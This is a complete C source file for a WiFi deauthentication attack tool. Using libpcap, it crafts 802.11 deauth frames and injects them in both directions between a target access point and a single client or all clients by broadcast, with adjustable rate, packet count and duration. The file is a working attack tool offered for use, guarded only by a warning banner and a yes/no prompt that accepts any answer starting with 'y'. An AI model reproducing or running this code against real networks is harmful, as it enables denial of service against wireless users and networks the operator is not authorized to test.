/*
 * WiFi Deauthentication Attack - C Implementation
 * =================================================
 *
 * High-performance implementation using raw sockets and libpcap.
 * Provides maximum control and minimal overhead.
 *
 * WARNING: This tool is for AUTHORIZED TESTING ONLY.
 *
 * Requirements:
 *   - libpcap-dev
 *   - Linux with wireless extensions
 *   - Root privileges
 *   - WiFi adapter in monitor mode
 *
 * Compilation:
 *   gcc -o deauth deauth.c -lpcap -O3
 *   sudo ./deauth --help
 *
 * Author: Wireless Security Research
 * License: Educational Use Only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <pcap.h>
#include <sys/types.h>
#include <arpa/inet.h>

/* ========================================================================
 * Constants & Configuration
 * ======================================================================== */

#define VERSION "1.0"
#define MAX_PACKET_SIZE 2048
#define DEFAULT_REASON 7
#define DEFAULT_RATE 10.0

/* 802.11 Frame Control field values */
#define IEEE80211_FTYPE_MGMT 0x00
#define IEEE80211_STYPE_DEAUTH 0xC0

/* Global state for signal handling */
static volatile int g_running = 1;
static unsigned long g_packets_sent = 0;

/* ========================================================================
 * Data Structures
 * ======================================================================== */

/* Attack configuration */
typedef struct {
    char interface[32];
    unsigned char bssid[6];
    unsigned char client[6];
    int broadcast;
    int reason;
    unsigned long count;
    unsigned long duration;
    double rate;
    int channel;
    int verbose;
} attack_config_t;

/* 802.11 Radiotap Header (simplified) */
struct ieee80211_radiotap_header {
    uint8_t it_version;
    uint8_t it_pad;
    uint16_t it_len;
    uint32_t it_present;
} __attribute__((packed));

/* 802.11 Management Frame Header */
struct ieee80211_mgmt_hdr {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  da[6];  /* Destination address */
    uint8_t  sa[6];  /* Source address */
    uint8_t  bssid[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

/* Deauthentication frame body */
struct ieee80211_deauth {
    uint16_t reason_code;
} __attribute__((packed));

/* Complete deauth packet */
struct deauth_packet {
    struct ieee80211_radiotap_header radiotap;
    struct ieee80211_mgmt_hdr mgmt;
    struct ieee80211_deauth deauth;
} __attribute__((packed));

/* ========================================================================
 * Signal Handling
 * ======================================================================== */

void signal_handler(int signum) {
    printf("\n[!] Caught signal %d, shutting down...\n", signum);
    g_running = 0;
}

void setup_signal_handlers(void) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
}

/* ========================================================================
 * Utility Functions
 * ======================================================================== */

/* Parse MAC address from string "AA:BB:CC:DD:EE:FF" */
int parse_mac(const char *str, unsigned char *mac) {
    int values[6];
    int i;

    if (sscanf(str, "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return -1;
    }

    for (i = 0; i < 6; i++) {
        mac[i] = (unsigned char) values[i];
    }

    return 0;
}

/* Print MAC address */
void print_mac(const unsigned char *mac) {
    printf("%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* Check if running as root */
int check_root(void) {
    if (geteuid() != 0) {
        fprintf(stderr, "[!] ERROR: This program requires root privileges\n");
        fprintf(stderr, "    Run with: sudo %s\n", program_invocation_name);
        return -1;
    }
    return 0;
}

/* Request authorization */
int request_authorization(void) {
    char response[10];

    printf("\n");
    printf("======================================================================\n");
    printf("  WARNING: AUTHORIZATION REQUIRED\n");
    printf("======================================================================\n");
    printf("This tool will send deauthentication frames that will disconnect\n");
    printf("wireless clients from the specified access point.\n");
    printf("\n");
    printf("You MUST have written authorization to proceed.\n");
    printf("Unauthorized use is ILLEGAL.\n");
    printf("======================================================================\n");
    printf("\nDo you have authorization to proceed? (yes/NO): ");

    if (fgets(response, sizeof(response), stdin) == NULL) {
        return 0;
    }

    return (strncasecmp(response, "yes", 3) == 0 ||
            strncasecmp(response, "y", 1) == 0);
}

/* ========================================================================
 * Packet Crafting
 * ======================================================================== */

/* Craft deauthentication packet */
void craft_deauth_packet(struct deauth_packet *pkt,
                         const unsigned char *dst,
                         const unsigned char *src,
                         const unsigned char *bssid,
                         uint16_t reason) {
    /* Zero out packet */
    memset(pkt, 0, sizeof(*pkt));

    /* Radiotap header */
    pkt->radiotap.it_version = 0;
    pkt->radiotap.it_pad = 0;
    pkt->radiotap.it_len = htole16(sizeof(struct ieee80211_radiotap_header));
    pkt->radiotap.it_present = 0;

    /* 802.11 management header */
    pkt->mgmt.frame_control = htole16(IEEE80211_FTYPE_MGMT | IEEE80211_STYPE_DEAUTH);
    pkt->mgmt.duration = 0;
    memcpy(pkt->mgmt.da, dst, 6);
    memcpy(pkt->mgmt.sa, src, 6);
    memcpy(pkt->mgmt.bssid, bssid, 6);
    pkt->mgmt.seq_ctrl = 0;

    /* Deauth frame body */
    pkt->deauth.reason_code = htole16(reason);
}

/* ========================================================================
 * Attack Implementation
 * ======================================================================== */

/* Send deauth packet pair (bidirectional) */
int send_deauth_pair(pcap_t *handle,
                     const attack_config_t *config,
                     const unsigned char *target) {
    struct deauth_packet pkt;
    int ret;

    /* AP → Client */
    craft_deauth_packet(&pkt, target, config->bssid, config->bssid, config->reason);
    ret = pcap_inject(handle, &pkt, sizeof(pkt));
    if (ret < 0) {
        fprintf(stderr, "[!] pcap_inject failed: %s\n", pcap_geterr(handle));
        return -1;
    }

    /* Client → AP */
    craft_deauth_packet(&pkt, config->bssid, target, config->bssid, config->reason);
    ret = pcap_inject(handle, &pkt, sizeof(pkt));
    if (ret < 0) {
        fprintf(stderr, "[!] pcap_inject failed: %s\n", pcap_geterr(handle));
        return -1;
    }

    g_packets_sent += 2;
    return 0;
}

/* Print attack statistics */
void print_status(time_t start_time) {
    time_t elapsed = time(NULL) - start_time;
    double rate = elapsed > 0 ? (double)g_packets_sent / elapsed : 0.0;

    printf("\r[*] Sent: %lu packets | Rate: %.1f pps | Elapsed: %ld s",
           g_packets_sent, rate, elapsed);
    fflush(stdout);
}

/* Main attack loop */
int run_attack(const attack_config_t *config) {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    unsigned char target[6];
    time_t start_time;
    unsigned long packet_count = 0;
    struct timespec sleep_time;
    int ret;

    /* Open pcap handle */
    handle = pcap_open_live(config->interface, MAX_PACKET_SIZE, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "[!] pcap_open_live failed: %s\n", errbuf);
        return -1;
    }

    /* Set monitor mode */
    if (pcap_set_rfmon(handle, 1) != 0) {
        fprintf(stderr, "[!] Warning: Failed to set monitor mode\n");
    }

    /* Determine target MAC */
    if (config->broadcast) {
        memset(target, 0xFF, 6);  /* Broadcast */
    } else {
        memcpy(target, config->client, 6);
    }

    /* Calculate sleep time for rate limiting */
    if (config->rate > 0) {
        sleep_time.tv_sec = 0;
        sleep_time.tv_nsec = (long)(1000000000.0 / config->rate);
    }

    /* Attack loop */
    start_time = time(NULL);
    g_running = 1;

    while (g_running) {
        /* Send deauth pair */
        ret = send_deauth_pair(handle, config, target);
        if (ret < 0) {
            break;
        }

        packet_count++;

        /* Check stop conditions */
        if (config->count > 0 && packet_count >= config->count) {
            break;
        }

        if (config->duration > 0) {
            if ((time(NULL) - start_time) >= config->duration) {
                break;
            }
        }

        /* Rate limiting */
        if (config->rate > 0) {
            nanosleep(&sleep_time, NULL);
        }

        /* Print status every 10 packets */
        if (config->verbose && (packet_count % 10 == 0)) {
            print_status(start_time);
        }
    }

    /* Final statistics */
    if (config->verbose) {
        time_t elapsed = time(NULL) - start_time;
        double avg_rate = elapsed > 0 ? (double)g_packets_sent / elapsed : 0.0;

        printf("\n\n");
        printf("======================================================================\n");
        printf("  Attack Completed - Statistics\n");
        printf("======================================================================\n");
        printf("Total Packets:   %lu\n", g_packets_sent);
        printf("Duration:        %ld seconds\n", elapsed);
        printf("Average Rate:    %.2f packets/second\n", avg_rate);
        printf("======================================================================\n\n");
    }

    pcap_close(handle);
    return 0;
}

/* ========================================================================
 * CLI & Main
 * ======================================================================== */

void print_usage(const char *prog) {
    printf("WiFi Deauthentication Attack - C Implementation v%s\n\n", VERSION);
    printf("Usage: %s [OPTIONS]\n\n", prog);
    printf("Required:\n");
    printf("  -i <interface>     WiFi interface in monitor mode\n");
    printf("  -b <BSSID>         Target AP BSSID (MAC address)\n");
    printf("  -c <client>        Target client MAC address\n");
    printf("  OR\n");
    printf("  --broadcast        Target all clients (broadcast)\n\n");
    printf("Optional:\n");
    printf("  --reason <code>    Deauth reason code (default: 7)\n");
    printf("  -n <count>         Number of packets to send\n");
    printf("  -d <duration>      Attack duration in seconds\n");
    printf("  -r <rate>          Packets per second (default: 10.0)\n");
    printf("  --channel <ch>     WiFi channel\n");
    printf("  -q                 Quiet mode\n");
    printf("  -h, --help         Show this help\n\n");
    printf("Examples:\n");
    printf("  sudo %s -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 -n 100\n", prog);
    printf("  sudo %s -i wlan0mon -b AA:BB:CC:DD:EE:FF --broadcast -d 30\n\n", prog);
}

int main(int argc, char *argv[]) {
    attack_config_t config = {0};
    int opt;
    int i;

    /* Default values */
    config.reason = DEFAULT_REASON;
    config.rate = DEFAULT_RATE;
    config.verbose = 1;

    /* Parse arguments */
    for (i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            strncpy(config.interface, argv[++i], sizeof(config.interface) - 1);
        } else if (strcmp(argv[i], "-b") == 0 && i + 1 < argc) {
            if (parse_mac(argv[++i], config.bssid) < 0) {
                fprintf(stderr, "[!] Invalid BSSID format\n");
                return 1;
            }
        } else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
            if (parse_mac(argv[++i], config.client) < 0) {
                fprintf(stderr, "[!] Invalid client MAC format\n");
                return 1;
            }
        } else if (strcmp(argv[i], "--broadcast") == 0) {
            config.broadcast = 1;
        } else if (strcmp(argv[i], "--reason") == 0 && i + 1 < argc) {
            config.reason = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
            config.count = atol(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            config.duration = atol(argv[++i]);
        } else if (strcmp(argv[i], "-r") == 0 && i + 1 < argc) {
            config.rate = atof(argv[++i]);
        } else if (strcmp(argv[i], "--channel") == 0 && i + 1 < argc) {
            config.channel = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-q") == 0) {
            config.verbose = 0;
        } else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_usage(argv[0]);
            return 0;
        }
    }

    /* Validate required arguments */
    if (strlen(config.interface) == 0) {
        fprintf(stderr, "[!] Missing required argument: -i <interface>\n");
        print_usage(argv[0]);
        return 1;
    }

    if (config.bssid[0] == 0 && config.bssid[1] == 0) {
        fprintf(stderr, "[!] Missing required argument: -b <BSSID>\n");
        print_usage(argv[0]);
        return 1;
    }

    if (!config.broadcast && (config.client[0] == 0 && config.client[1] == 0)) {
        fprintf(stderr, "[!] Must specify either -c <client> or --broadcast\n");
        print_usage(argv[0]);
        return 1;
    }

    if (config.count == 0 && config.duration == 0) {
        fprintf(stderr, "[!] Must specify either -n <count> or -d <duration>\n");
        return 1;
    }

    /* Check root */
    if (check_root() < 0) {
        return 1;
    }

    /* Request authorization */
    if (!request_authorization()) {
        printf("[!] Attack cancelled by user\n");
        return 1;
    }

    /* Setup signal handlers */
    setup_signal_handlers();

    /* Print configuration */
    if (config.verbose) {
        printf("\n======================================================================\n");
        printf("  WiFi Deauthentication Attack - Configuration\n");
        printf("======================================================================\n");
        printf("Interface:       %s\n", config.interface);
        printf("Target BSSID:    ");
        print_mac(config.bssid);
        printf("\nTarget Client:   ");
        if (config.broadcast) {
            printf("BROADCAST (all clients)");
        } else {
            print_mac(config.client);
        }
        printf("\nReason Code:     %d\n", config.reason);
        printf("Count:           %lu packets\n", config.count);
        printf("Duration:        %lu seconds\n", config.duration);
        printf("Rate:            %.1f pps\n", config.rate);
        printf("======================================================================\n\n");
    }

    /* Run attack */
    return run_attack(&config);
}
